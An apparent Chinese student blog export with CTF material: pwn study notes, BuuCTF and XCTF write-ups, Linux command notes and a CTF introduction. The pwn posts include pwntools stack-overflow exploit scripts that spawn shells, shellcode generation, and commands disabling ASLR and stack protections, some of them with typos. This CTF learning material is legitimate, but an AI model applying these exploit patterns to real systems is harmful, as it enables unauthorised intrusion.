{"meta":{"title":"【W】","subtitle":null,"description":"Less intrests , more interest .","author":["W"],"url":"https://0410wzn.top","root":"/"},"pages":[{"title":"categories","date":"2021-10-10T02:36:05.000Z","updated":"2021-10-10T02:36:05.623Z","comments":true,"path":"categories/index.html","permalink":"https://0410wzn.top/categories/index.html","excerpt":"","text":""},{"title":"link","date":"2021-11-27T15:41:21.000Z","updated":"2021-11-27T15:41:46.622Z","comments":true,"path":"link/index.html","permalink":"https://0410wzn.top/link/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-10-09T10:11:56.000Z","updated":"2021-10-09T10:12:29.226Z","comments":true,"path":"tags/index.html","permalink":"https://0410wzn.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PWN学习随笔","slug":"PWN学习随笔","date":"2021-11-27T15:27:04.000Z","updated":"2021-11-27T15:28:55.754Z","comments":true,"path":"2021/11/27/PWN学习随笔/","link":"","permalink":"https://0410wzn.top/2021/11/27/PWN%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/","excerpt":"","text":"PWN学习笔记——初稿注明：本篇学习笔记是入门学习pwn时的随笔，所以不具有任何参考价值 ，仅作为对学习路线回顾参考的笔记以及入门纪念。 ​ 人生苦短，我学PWN！ ***师傅，师傅，我该怎么入门？***🐉不用担心，使用 Kali Linux ， 称霸局域网 ！[doge] (我用的kali😥) 来堪堪函数调用的栈？ 调试，调试！Ida中的静态调试显示的函数和输出之间的距离，有时候会因为各种原因😁而显示错误，需要用pwndbg动态调试观察一下。淦，gdb显示的地址有时候也不对 IDA基本操作 (静态调试) shift + F12 space F5 ctrl + F ***Pwndbg基本操作***（动态调试） Pwndbg + 文件名 进入对某个文件的调试 r 运行 b + 地址/函数 设置断点 checksec + 文件名 查看保护措施 stack + 数字 查看栈段 vmmap’ 显示虚拟内存的的空间分布(观察读写的权 限是否有冲突-w与x不同时出现 plt 查看文件里的plt表项 x + 地址 显示该地址的内容和地址 got 查看got中保存的函数数量及其字节、数据等信息 disass + 地址 反汇编地址的数据，进而查看其汇编代码或plt c 继续执行程序，直到遇到断点/程序中断 start 开始执行程序，会停到main函数；如果没有main函数，则会停到程 序的入口 s 附近 backtrace 显示函数调用栈段的状态 return 快速回到mian函数 求求了，用用py吧 🐶(context.arch = “amd64”) 调整攻击环境 shellcode.sh() print(xxx) 更清楚地查看shellcode print(asm(xxx)) 查看shellcode的机器码 获取shellcode : 1.shellstore 2.pwntools – shellcraft.sh() (后面就是方法) print(asm(shellcode.(amd64.)sh())) elf.got() 查看字典的索引值 64位👆 32位👆 上面比较短的，比如8048，就是elf文件的代码段； 以f7开头的，说明其在比较高的中间位置，大致是在libc处； 更大的，fff，就是栈的地址 嘿嘿嘿·🤭，脚本（介绍一下大致模板，最简单的那种啊，别误会）vim exp.py 1234567891011121314151617181920from pwn import *(context.arch = &quot;amd64&quot;)io = process(&quot;本地文件路径&quot;) //与本地文件交互 OR io = remote(&quot;IP&quot;, 端口 )io.recvline() //接受程序给的文件payload = b&#x27;”x”(字节型的数据) + p32(劫持程序的地址) //将一个整数的地址转化成字节型的数据 32位的 ebp占4个字节，64位的·ebp占8个字节io.send(payload) //发送数据 OR io.sendline(payload) //发送一行数据，相当于在数据末尾加/n;io.interactive() //交互 1234567891011121314151617181920212223from pwn import *(context.arch = &quot;amd64&quot;)io = process(&quot;本地文件路径&quot;) //与本地文件交互 OR io = remote(&quot;IP&quot;, 端口 )io.recvline() //接受程序给的文件asm(shellcode.(amd64.)sh()) //获取shellcode的机器码 payload = asm( shellcode.(amd64.)sh()),lhust( 112， b’A ) /*补充字节流（这里就是A ）到112 */ + p32( 劫持程序的地址(可以是全局变量的地址) )io.send(payload) //发送数据 OR io.sendline(payload) //发送一行数据，相当于在数据末尾加/n;io.interactive() //交互 还有很多呐！ 呐，shellcode注意啥啊 bss默认可执行，因此我们可以通过全局变量向其输入shellcode gets 漏洞 未初始化的全局变量保存在bss里 不会算数，py来救使用python计算栈段之间的距离 0x….(高地址) – 0x…(低地址) &gt;&gt;&gt;十进制数 Hex(十进制) &gt;&gt;&gt;十六进制 保护措施 🛡1-NX 栈不可执行 2-ASLR 让函数的栈、共享连接库、堆段进行地址随机化， ​ 0 – 未打开；1 – 部分随机化；2 – 全部随机化 ​ 关闭ASLR – “echo 0 &gt; /proc/sys/kernel/randomize_va_space” 3-Canary（金丝雀） 在调用一个函数，刚创建栈帧时，首先把一个值（canary）放在低地址空间里，在销毁 函数时，先检查这个值（canary）是否发生改变，如果值改变，就会其强行将程序退出 4-Pie 编译时打开开关，随机化elf文件映像（text，bss。data） ***程序进不去怎么办***😱修改文件权限 1234#!/bin/shgcc -fno-stack-protector -z execstack -no-pie -g -o re2stack ret2stack.c -fno-stack-protector 关闭canary，使栈溢出首先可行 -z execstack 打开栈的可执行权限 -no-pie 关闭pie -g 带上调试信息，便于观看（一定要带着re2stack.c） -o 输出文件名 ***请问字节是啥***🤐8比特 – 1 字节 每4比特可以直接写成一个16进制的值， 每两个16进制数就是1个字节 ROP！！！没有连续的代码，但是通过一段一段的这个函数中包含的代码片段，达到相同的执行效果，即模拟程序的执行 其中思想的不同:没有一步到位的地址一次覆盖到tet，调用shell（即调用shell攻击目标，无法通过一个地址一次，所以需要，自己将程序中的指令组合起来，起到shell的作用） 我们所需要的为eaxebx…赋值的代码本来就存在，但是不连续，我们需要把他们组成一个链式结构（gadget），所以需要溢出很长的一段数据，把这些调成想要的格式，使其能够连续工作，并使其最后一条指令为ret。 对于系统调用，要在所有以ret结尾的代码中，找出个代码片段，它们的作用分别是pop eax、pop ebx、pop ecx、pop edx，pop一个寄存器的指令可以将数值直接写到栈上 PS：**系统调用 **—— 本质上只是一段函数，X86使用中断进行系统调用，第一个栈帧是main函数的栈帧，在main函数之前执行的所有函数都是没有栈帧的 ret2syscall 因为需要执行大量代码段，故通过局部变量溢出， 组合一些gadget执行大量的代码片段，故将从ret开始的一大段栈空间，覆盖成gadget地址和对应的参数，此时，在main函数返回时，就会返回到已经被覆盖掉的，现在是ret的地址， 并执行指令 （ret把当前栈顶的值pop到eip）ret等效于pop eip get ­­­­­­­­­­­­­­­­­­­­–binary 文件名 – only “ pop | ret 要寻找的指令|管道符 grep xx 把输入参数中含有xx的命令显示出来 Ret = pop xxx 即把xxx弹出到eip Xor 清空寄存器 下面是示例！ Int 0x80 （ eax = 0xb , ebx = …, ecx = 0,edx = 0 ）进行系统调用（ int – 中断指令 ），通过寄存器传参，来确定要调用哪一个函数。在执行int 0x80 这个汇编代码对应的机器码时，要确保四个寄存器都已经存储了对应的函数所需要的参数，即0xb这一个系统调用号对应的sys_execve() 对应的内核里的函数的调用号，而0xb 在这里·也带代表了那个函数 下面使用pwntools便捷获取/bin/sh的地址 使用next传入生成器 最后一层是要输入的垃圾数据，倒数第三行是要给 倒数第二层输入的数据，以此类推 动态链接 当我们使用file命令去查看一些文件的属性时，下面两点也会被显示出来： 动态链接：gcc -fno-pie -o dytest xxx.py dynamically link 静态链接：gcc -fno-poe –static -o statest xxx.py statically link 本块主要讨论动态链接 动态链接相关结构 dynamic section 为操作系统描述了整个动态链接的完整内容 ​ 提供动态链接相关信息 link_map 保存进程载入的动态链接库的链表 dl_runtime_resolve 解析第一次在动态链接的函数的真实地址 ​ 装载器中用于解析动态链接库中函数的实际地址的函数 got 全局的符号、变量地址 got.plt 全局的函数地址 动态占用内存小（其库函数占用少） 动态链接过程 ldd 文件名 查看文件用到的所有动态链接库 下面分流程分析 text —— 代码节；foo@olt —— foo是自己写的函数；plt是代码段中存放函数真实地址的一个节； PLT0（PLT最开始的两段指令） 因为foo是个动态链接库中的代码，所以call foo，并不能直接跳转到它自己代码段里的foo函数，只能去代码段中的plt节，而每个被调用的动态链接库中的函数都会在其中创立一个表项， 1、call foo@plt 进程首次调用 foo 2、jmp *(foo@GOT) 跳转到 .plt 中的 foo 表项，plt 中的代码立即跳转到.got.plt 中记录的地址 3、push 由于进程是第一次调用 foo，故.got.plt 中记录的地址是 foo@plt+1 4、jmp 回到 .plt 是，解析 foo 的实际地址 5、push *(GOT+4) 跳转到 .plt 头部，为 dl_runtime_resolve 函数传参 6、push *(GOT+4) 跳转到 .plt 头部，为 dl_runtime_resolve 函数传参 7、call_fix_up dl_runtime_resolve 函数解析 foo 的真正地址填入 .got.plt 中 8、ret 0xc 此后 .got.plt 中保存的是 foo 的真实地址 9、call foo@plt 系统第二次调用foo 10、jum *(foo@GOT) 直接自 .got.plt 跳转到 foo 的真实地址，没有了第一次的解析地址过程 ok，接下来展示完整流程 IDA的细节init 用作初始化的一个节，记录了初始化代码 plt 存放函数真实地址的一个节 got 存放数据的节 ret2libc往往依赖于rop所需要的各种gadget创造执行shellcode的环境，但其目标是返回libc里的system函数这一类可以为我们提供一个shell的函数 进程虚拟地址空间地址以字节编码 1Byte = 8bits 常以16进制表示 0x3c = 00111100 虚拟内存用户空间每个进程一份 虚拟内存内核空间所有进程共享一份 虚拟内存mmap段中的动态链接库仅在物理内存中装载一份 PIE","categories":[],"tags":[{"name":"人生苦短，我学pwn","slug":"人生苦短，我学pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"}]},{"title":"BuuCTF杂项WP","slug":"BuuCTF杂项WP","date":"2021-11-25T15:45:41.000Z","updated":"2021-12-07T00:46:30.794Z","comments":true,"path":"2021/11/25/BuuCTF杂项WP/","link":"","permalink":"https://0410wzn.top/2021/11/25/BuuCTF%E6%9D%82%E9%A1%B9WP/","excerpt":"","text":"BuuCTF杂项WP https://buuoj.cn/challenges 金三胖下载附件如下： 仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧： 答案显而易见对吧！ 二维码下载附件如下： 别怕，扫描一下： 很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析 果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破 解压，拿到flag！ 你竟然赶我走！hahaha，看看附件： 没啥可说的，010或者hex一看有惊喜 有N种方法解决呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现 编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！ 扫一扫，得到答案！ 大白下载附件如图： 又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！ 根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍 PNG文件分析 基础破解emmm…都提示暴力破解了，那就乖乖暴力破解吧。 嘿嘿嘿🤭，爆破出来了！ 解压文件，得到一段base64编码，转换即有flag！ 乌镇峰会种图图片里有啥信息？没啥好吧，010或者hex一看就ok 文件中的秘密emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。 LSBlsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形： Data Extract 提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可 Wireshark分析流量包，自然是使用wireshark了！ emmm…该看啥啊？ 划重点经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选筛选语句如下： http.request.method==POST 只有一条！追踪其TCP流即可找到password，即flag rar告诉4位数字了，爆破就完了呗，拜拜 zip伪加密压缩包文件分析： 依据上述知识点，我们打开010 发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag qr真就是：“二维码，谁用谁知道”，拜拜~ 被嗅探的流量提到流量分析，自然又是wireshark！ 过滤 flag出来了。 镜子里面的世界这个题啊，镜子里面啊，想隐写啊。（010、binwalk找不出啥来才想的🐶,） LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ningen得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。 提取出来，爆破即可。 里面的文档即使flag 小明的保险箱,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了 爱因斯坦拿到题后，习惯性看一下属性，发现有一点值得注意的地方 暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？ 抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。 easycapemmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、 隐藏的钥匙呐呐呐，属性、010，wait！010真的找出了东西哎！ 依据提示，base64转码即可 另外一个世界属性，010，这次，我们又在010里找到了不寻常的地方 一串2进制编码！ 解码即可。 FLAG 在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕） 左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！ 一头雾水的我选择使用file命令辨别其文件类型 elf文件，这真的是道misc，不是pwn？？？ ida打开，堪堪main函数，神奇的事情出现了！ ok，解决了 假如给我三天光明ctfer当真啥都要会啊。。。 别问，问就是盲文 解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图 别问，问就是摩斯电码（一边对着一边打，眼要瞎了） -.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –.. 线上解码即可 神秘龙卷风依照题目所给信息爆破 打开压缩包文本，发现神秘龙卷风 很明显是brainfuck，在线解码即可 后门查杀后门查杀，就查杀后门呗😓 题目已经提醒了密码即为flag，搜索pass，即可找到 数据包中的线索题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。 emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码 bae64解码，flag出现 荷兰带宽数据泄露下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。 来首歌吧音频隐写，拖进audacity， 明显的摩斯 … -… -.-. —-. …— … -… …- —-. -.-. -… —– .—- —… —… …-. … …— . -… .—- –… -… –… —– —-. …— —-. .—- —-. .—- -.-. 在线转码即可出flag Webshell后门emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐 面具下的flag属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！ 但当我们兴高采烈的准备爆破时 为什么呢？—— 联系前面做题的经验，我们猜测是伪加密 果然是，我们将其更改，如上图 在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧） 原来是把文件当压缩文件！ 7Z命令 可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题 提取出了多个文件夹，其中两个明显提示有flag one two 解码即可 九连环下载好图片后，属性没提示，但在010里搜flag发现了一些东西 估计flag就在这个文档里，走，上binwalk！ 里面果然还有东西，把他们都提取出来 steghide的使用 steghide的使用 使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。 被劫持的神秘礼物wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。 嗯，然后随波逐流哈希一下，嗯 此即为flagヾ(≧▽≦*)o 刷新过的图片提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写 F555 java Extract “待提取的图片路径” 即会提取出其中文件，如下： 我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是 拖到win里更改后缀，发现解压需要解压码，于是去爆破 为什么没有文件？—— 依照前面的经验，怀疑是伪加密 果然是 解出来了！！！睡觉！！！ Snake属性没啥东西哦，然后堪堪010，结果发现以下·信息 但是——没啥用，还是老老实实binwalk吧 提取出的文件如下所示 cipher里一堆乱码，看key，key里是如下文本 V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo= 明显的base64，解码得 What is Nicki Minaj’s favorite song that refers to snakes? 想来应该key是Anaconda(水蚺—南美洲蟒蛇)，但问题又来了，这是个什么编码？？？ 最后经过查看WP，才知晓，这是一种名为“Serpent (蛇; 尤指大蛇;)”，合着这题真就snake了 Serpent 在线解码网址：http://serpent.online-domain-tools.com/ flag解出。","categories":[],"tags":[{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"}]},{"title":"攻防世界PWN新手区WP（长期更新）","slug":"攻防世界PWN新手区WP（长期更新）","date":"2021-11-17T11:02:54.000Z","updated":"2021-11-19T03:12:00.167Z","comments":true,"path":"2021/11/17/攻防世界PWN新手区WP（长期更新）/","link":"","permalink":"https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"攻防世界PWN新手区WP（长期更新） 题目地址：https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0 一、get_shell 获取靶场,nc登上查看即可， 二、Hello pwn! 首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。 嗯，只开了NX，好耶！ 接下来用64位的ida打开分析逻辑，如下图 看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。 明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下： 1234567891011from pwn import *context.arch = &quot;amd64&quot;p = remote(&#x27;地址&#x27;， 端口)payload = b&#x27;a&#x27; * ( 0x60106C - 0x60106C ) + p64(1853186401)io.sendlineafter(&quot;bof\\n&quot;, payload)io.interactive() 运行，皆大欢喜。 三、level0 先用checksec看一下文件位数和保护措施，如下图 依旧是只有NX开了，题目应该比较简单 将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数， 发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数 发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下： 12345678910111213from pwn import *context,arch = &quot;amd64&quot; // 切换环境io = remote(&#x27;地址&#x27;, 端口)callsystem = 0x400596 // 函数在栈中的位置payload = b&#x27;a&#x27; * ( 0x80 + 0x08 ) + p64( callsystem ) // 使程序最终运行后门函数io = sendline( payload )io.interactive() 运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。","categories":[],"tags":[{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"}]},{"title":"linux学习札记","slug":"linux学习札记","date":"2021-10-20T15:35:51.000Z","updated":"2021-10-23T16:17:49.911Z","comments":true,"path":"2021/10/20/linux学习札记/","link":"","permalink":"https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/","excerpt":"","text":"本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。 1、pwd pwd命令常用于得知操作者目前所在的目录名称。 2、ls ls命令用于显示目前操作者所在目录之下的内容 -a 显示所有文件及目录 (. 开头的隐藏文件也会列出) -l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出 -r 将文件以相反次序显示(原定依英文字母次序) -t 将文件依建立时间之先后次序列出 -A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录) -F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“ -R 若目录下有文件，则以下之文件亦皆依序列出 3、 cat cat命令用于连接文件并打印到标准输出设备上 -n 或 –number**：由 1 开始对所有输出的行数编号。 -b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号 -s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行 -v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外 -E 或 –show-ends : 在每行结束处显示 $ -T 或 –show-tabs: 将 TAB 字符显示为 ^I -A, –show-all：等价于 -vET -e：**等价于”-vE”选项 -t：**等价于”-vT”选项 例： 4、 file file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的文件头来判断的，因此linux可以准确地判断文件为何种类型。 -b 列出辨识结果时，不显示文件名称 -c 详细显示指令执行过程，便于排错或分析程序执行的情形 -f &lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称 -L 直接显示符号连接所指向的文件的类别 -m &lt;魔法数字文件&gt; 指定魔法数字文件 -v 显示版本信息 -z 尝试去解读压缩文件的内容 [文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件 例： 5、 find find一般用来查找指定目录下的文件，如果未加参数，则会将查到的子目录与文件全部显示。 由于参数过多，下面只列出较为常用的部分： -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件 -amin n : 在过去 n 分钟内被读取过 -anewer file : 比文件 file 更晚被读取过的文件 -atime n : 在过去n天内被读取过的文件 -cmin n : 在过去 n 分钟内被修改过 -cnewer file :比文件 file 更新的文件 -ctime n : 在过去n天内被修改过的文件 -empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name -ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写 -name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写 -size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。 -type c : 文件类型是 c 的文件。 d: 目录 c: 字型装置文件 b: 区块装置文件 p: 具名贮列 f: 一般文件 l: 符号连结 s: socket -pid n : process id 是 n 的文件 例：（这里与下一命令size一起列出）","categories":[],"tags":[{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"}]},{"title":"攻防世界MISC新手题部分WP(更新ing)","slug":"攻防世界MISC新手题部分WP-更新ing","date":"2021-10-10T00:34:06.000Z","updated":"2021-10-29T08:51:16.920Z","comments":true,"path":"2021/10/10/攻防世界MISC新手题部分WP-更新ing/","link":"","permalink":"https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/","excerpt":"","text":"攻防世界Misc新手题WP 地址：https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0 一、PDF 菜猫给了菜狗一张图，说图下面什么都没有 因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。 首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。 通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。 当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！ 复制粘贴结束。 二、give_you_flag 菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 下载附件后，看到如下动图。 ​ 题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由 此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！ 我们使用分帧工具将图片提取出来，得到带有二维码的图片 ​ 很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。","categories":[],"tags":[{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"CTF简介","slug":"CTF简介","date":"2021-10-09T13:57:31.000Z","updated":"2021-10-29T08:50:20.255Z","comments":true,"path":"2021/10/09/CTF简介/","link":"","permalink":"https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/","excerpt":"","text":"一、CTF简介 Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:CTF词条。 CTF 二、CTF的题目类型​ CTF的题目类型大致包括以下五种： Web，Pwn，Misc， Reverse，Crypto Web​ Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如SQL注入、XSS、代码执行、代码审计等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件. Pwn​ Pwn类题目重点考察选手对于二进制漏洞的挖掘和利用能力，其考点也通常在堆栈溢出、格式化漏洞、UAF、Double Free等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(Exploit)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为nc IP_ADDRESS PORT，例如nc 1.2.3.4 4567这种形式，表示在1.2.3.4这个IP的4567端口上运行了该题目 MiscMisc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag 常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。 Reverse​ Reverse题目考察选手逆向工程能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。 Crypto​ Crypto类题目考察选手对密码学相关知识的了解程度，诸如RSA、AES、DES等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。 三、CTF的比赛形式 CTF的比赛形式主要包括以下几种：理论类，Jeopardy-解题)，AwD-攻防，RHG-自动化，RW-真实世界，KoH-抢占山头，MIX-混合 理论类​ 理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选 Jeopardy-解题​ 参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。 AwD-攻防​ Attack with Defense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。 RHG-自动化​ Robo Hacking Game(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。 RW-真实世界​ Real World(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 